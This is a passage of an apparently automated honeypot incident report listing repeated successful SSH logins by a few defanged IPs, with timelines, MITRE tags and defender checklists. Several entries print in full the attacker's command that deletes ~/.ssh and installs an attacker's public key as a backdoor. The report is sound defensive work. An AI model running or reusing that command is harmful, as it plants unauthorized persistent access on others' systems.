| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:59:52` | `cowrie.session.connect` |
| `2026-05-23 21:59:52` | `cowrie.client.version` |
| `2026-05-23 21:59:52` | `cowrie.client.kex` |
| `2026-05-23 21:59:53` | `cowrie.login.success` |
| `2026-05-23 21:59:54` | `cowrie.session.params` |
| `2026-05-23 21:59:54` | `cowrie.command.input` |
| `2026-05-23 21:59:54` | `cowrie.command.failed` |
| `2026-05-23 21:59:54` | `cowrie.log.closed` |
| `2026-05-23 21:59:55` | `cowrie.session.params` |
| `2026-05-23 21:59:55` | `cowrie.command.input` |
| `2026-05-23 21:59:55` | `cowrie.session.file_download` |
| `2026-05-23 21:59:55` | `cowrie.log.closed` |
| `2026-05-23 22:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac91565f918

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 21:59 |
| **Last Seen** | 2026-05-23 22:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 21:59:58` | `cowrie.session.connect` |
| `2026-05-23 21:59:58` | `cowrie.client.version` |
| `2026-05-23 21:59:59` | `cowrie.client.kex` |
| `2026-05-23 22:00:00` | `cowrie.login.success` |
| `2026-05-23 22:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20058cbbe4a0

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:08 |
| **Last Seen** | 2026-05-23 22:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:08:31` | `cowrie.session.connect` |
| `2026-05-23 22:08:31` | `cowrie.client.version` |
| `2026-05-23 22:08:32` | `cowrie.client.kex` |
| `2026-05-23 22:08:33` | `cowrie.login.success` |
| `2026-05-23 22:08:34` | `cowrie.session.params` |
| `2026-05-23 22:08:34` | `cowrie.command.input` |
| `2026-05-23 22:08:34` | `cowrie.command.failed` |
| `2026-05-23 22:08:35` | `cowrie.log.closed` |
| `2026-05-23 22:08:35` | `cowrie.session.params` |
| `2026-05-23 22:08:35` | `cowrie.command.input` |
| `2026-05-23 22:08:35` | `cowrie.session.file_download` |
| `2026-05-23 22:08:35` | `cowrie.log.closed` |
| `2026-05-23 22:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d7b80ad3afb

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:08 |
| **Last Seen** | 2026-05-23 22:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:08:39` | `cowrie.session.connect` |
| `2026-05-23 22:08:39` | `cowrie.client.version` |
| `2026-05-23 22:08:39` | `cowrie.client.kex` |
| `2026-05-23 22:08:41` | `cowrie.login.success` |
| `2026-05-23 22:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2879a5743206

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 22:08 |
| **Last Seen** | 2026-05-23 22:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:08:58` | `cowrie.session.connect` |
| `2026-05-23 22:08:58` | `cowrie.client.version` |
| `2026-05-23 22:08:58` | `cowrie.client.kex` |
| `2026-05-23 22:09:00` | `cowrie.login.success` |
| `2026-05-23 22:09:00` | `cowrie.session.params` |
| `2026-05-23 22:09:00` | `cowrie.command.input` |
| `2026-05-23 22:09:00` | `cowrie.command.failed` |
| `2026-05-23 22:09:01` | `cowrie.log.closed` |
| `2026-05-23 22:09:01` | `cowrie.session.params` |
| `2026-05-23 22:09:01` | `cowrie.command.input` |
| `2026-05-23 22:09:01` | `cowrie.session.file_download` |
| `2026-05-23 22:09:01` | `cowrie.log.closed` |
| `2026-05-23 22:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b02e9e2acbf

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 22:09 |
| **Last Seen** | 2026-05-23 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:09:04` | `cowrie.session.connect` |
| `2026-05-23 22:09:04` | `cowrie.client.version` |
| `2026-05-23 22:09:05` | `cowrie.client.kex` |
| `2026-05-23 22:09:06` | `cowrie.login.success` |
| `2026-05-23 22:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a2646917a6

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 22:18 |
| **Last Seen** | 2026-05-23 22:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:18:11` | `cowrie.session.connect` |
| `2026-05-23 22:18:11` | `cowrie.client.version` |
| `2026-05-23 22:18:11` | `cowrie.client.kex` |
| `2026-05-23 22:18:13` | `cowrie.login.success` |
| `2026-05-23 22:18:13` | `cowrie.session.params` |
| `2026-05-23 22:18:13` | `cowrie.command.input` |
| `2026-05-23 22:18:13` | `cowrie.command.failed` |
| `2026-05-23 22:18:14` | `cowrie.log.closed` |
| `2026-05-23 22:18:14` | `cowrie.session.params` |
| `2026-05-23 22:18:14` | `cowrie.command.input` |
| `2026-05-23 22:18:14` | `cowrie.session.file_download` |
| `2026-05-23 22:18:14` | `cowrie.log.closed` |
| `2026-05-23 22:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de7bff2260c0

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 22:18 |
| **Last Seen** | 2026-05-23 22:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:18:17` | `cowrie.session.connect` |
| `2026-05-23 22:18:17` | `cowrie.client.version` |
| `2026-05-23 22:18:18` | `cowrie.client.kex` |
| `2026-05-23 22:18:19` | `cowrie.login.success` |
| `2026-05-23 22:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de639a0b8a30

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:28 |
| **Last Seen** | 2026-05-23 22:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:28:38` | `cowrie.session.connect` |
| `2026-05-23 22:28:38` | `cowrie.client.version` |
| `2026-05-23 22:28:39` | `cowrie.client.kex` |
| `2026-05-23 22:28:40` | `cowrie.login.success` |
| `2026-05-23 22:28:40` | `cowrie.session.params` |
| `2026-05-23 22:28:40` | `cowrie.command.input` |
| `2026-05-23 22:28:40` | `cowrie.command.failed` |
| `2026-05-23 22:28:40` | `cowrie.log.closed` |
| `2026-05-23 22:28:41` | `cowrie.session.params` |
| `2026-05-23 22:28:41` | `cowrie.command.input` |
| `2026-05-23 22:28:41` | `cowrie.session.file_download` |
| `2026-05-23 22:28:41` | `cowrie.log.closed` |
| `2026-05-23 22:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e30656fa9b

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:28 |
| **Last Seen** | 2026-05-23 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:28:44` | `cowrie.session.connect` |
| `2026-05-23 22:28:44` | `cowrie.client.version` |
| `2026-05-23 22:28:44` | `cowrie.client.kex` |
| `2026-05-23 22:28:45` | `cowrie.login.success` |
| `2026-05-23 22:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43961ef33b2e

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 22:31 |
| **Last Seen** | 2026-05-23 22:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:31:49` | `cowrie.session.connect` |
| `2026-05-23 22:31:49` | `cowrie.client.version` |
| `2026-05-23 22:31:50` | `cowrie.client.kex` |
| `2026-05-23 22:31:51` | `cowrie.login.success` |
| `2026-05-23 22:31:51` | `cowrie.session.params` |
| `2026-05-23 22:31:51` | `cowrie.command.input` |
| `2026-05-23 22:31:51` | `cowrie.command.failed` |
| `2026-05-23 22:31:52` | `cowrie.log.closed` |
| `2026-05-23 22:31:52` | `cowrie.session.params` |
| `2026-05-23 22:31:52` | `cowrie.command.input` |
| `2026-05-23 22:31:52` | `cowrie.session.file_download` |
| `2026-05-23 22:31:52` | `cowrie.log.closed` |
| `2026-05-23 22:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecbe871bba0a

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-23 22:31 |
| **Last Seen** | 2026-05-23 22:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:31:56` | `cowrie.session.connect` |
| `2026-05-23 22:31:56` | `cowrie.client.version` |
| `2026-05-23 22:31:56` | `cowrie.client.kex` |
| `2026-05-23 22:31:57` | `cowrie.login.success` |
| `2026-05-23 22:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38d2f11cc68a

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:40 |
| **Last Seen** | 2026-05-23 22:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:40:24` | `cowrie.session.connect` |
| `2026-05-23 22:40:24` | `cowrie.client.version` |
| `2026-05-23 22:40:24` | `cowrie.client.kex` |
| `2026-05-23 22:40:25` | `cowrie.login.success` |
| `2026-05-23 22:40:26` | `cowrie.session.params` |
| `2026-05-23 22:40:26` | `cowrie.command.input` |
| `2026-05-23 22:40:26` | `cowrie.command.failed` |
| `2026-05-23 22:40:27` | `cowrie.log.closed` |
| `2026-05-23 22:40:27` | `cowrie.session.params` |
| `2026-05-23 22:40:27` | `cowrie.command.input` |
| `2026-05-23 22:40:27` | `cowrie.session.file_download` |
| `2026-05-23 22:40:27` | `cowrie.log.closed` |
| `2026-05-23 22:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0e5b717c74

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:40 |
| **Last Seen** | 2026-05-23 22:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:40:32` | `cowrie.session.connect` |
| `2026-05-23 22:40:32` | `cowrie.client.version` |
| `2026-05-23 22:40:32` | `cowrie.client.kex` |
| `2026-05-23 22:40:33` | `cowrie.login.success` |
| `2026-05-23 22:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-363b58bd57bf

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:53 |
| **Last Seen** | 2026-05-23 22:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:53:19` | `cowrie.session.connect` |
| `2026-05-23 22:53:19` | `cowrie.client.version` |
| `2026-05-23 22:53:19` | `cowrie.client.kex` |
| `2026-05-23 22:53:19` | `cowrie.login.success` |
| `2026-05-23 22:53:20` | `cowrie.session.params` |
| `2026-05-23 22:53:20` | `cowrie.command.input` |
| `2026-05-23 22:53:20` | `cowrie.command.failed` |
| `2026-05-23 22:53:21` | `cowrie.log.closed` |
| `2026-05-23 22:53:21` | `cowrie.session.params` |
| `2026-05-23 22:53:21` | `cowrie.command.input` |
| `2026-05-23 22:53:21` | `cowrie.session.file_download` |
| `2026-05-23 22:53:21` | `cowrie.log.closed` |
| `2026-05-23 22:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4150c4e073

| Field | Detail |
|---|---|
| **Source IP** | `197.227.14[.]33` |
| **First Seen** | 2026-05-23 22:53 |
| **Last Seen** | 2026-05-23 22:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:53:24` | `cowrie.session.connect` |
| `2026-05-23 22:53:24` | `cowrie.client.version` |
| `2026-05-23 22:53:24` | `cowrie.client.kex` |
| `2026-05-23 22:53:25` | `cowrie.login.success` |
| `2026-05-23 22:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.14[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.227.14[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77d27328288

| Field | Detail |
|---|---|
| **Source IP** | `172.174.5[.]146` |
| **First Seen** | 2026-05-23 22:55 |
| **Last Seen** | 2026-05-23 22:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:55:42` | `cowrie.session.connect` |
| `2026-05-23 22:55:42` | `cowrie.client.version` |
| `2026-05-23 22:55:42` | `cowrie.client.kex` |
| `2026-05-23 22:55:43` | `cowrie.login.success` |
| `2026-05-23 22:55:43` | `cowrie.session.params` |
| `2026-05-23 22:55:43` | `cowrie.command.input` |
